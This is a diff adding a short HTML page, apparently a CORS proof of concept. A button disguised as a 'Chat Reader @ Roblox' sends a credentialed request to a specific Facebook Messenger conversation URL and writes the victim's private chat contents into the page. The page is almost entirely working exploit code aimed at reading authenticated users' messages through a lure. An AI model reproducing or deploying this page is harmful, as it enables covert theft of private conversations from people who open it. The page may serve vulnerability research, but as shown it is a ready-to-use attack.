@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Page Title</title>
+</head>
+<body>
+<h2>CORS To Read Chat</h2>
+<div id="demo">
+<button type="button" onclick="cors()">Chat Reader @ Roblox</button>
+</div>
+
+<script>
+function cors() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      document.getElementById("demo").innerHTML = document.write(this.responseText);
+    }
+  };
+  xhttp.open("GET", "https://m.facebook.com/messages/read/?tid=cid.g.2821504191244223&entrypoint=jewel&refid=11", true);
+  xhttp.withCredentials = true;
+  xhttp.send();
+}
+</script>
+
+</body>
+</html>
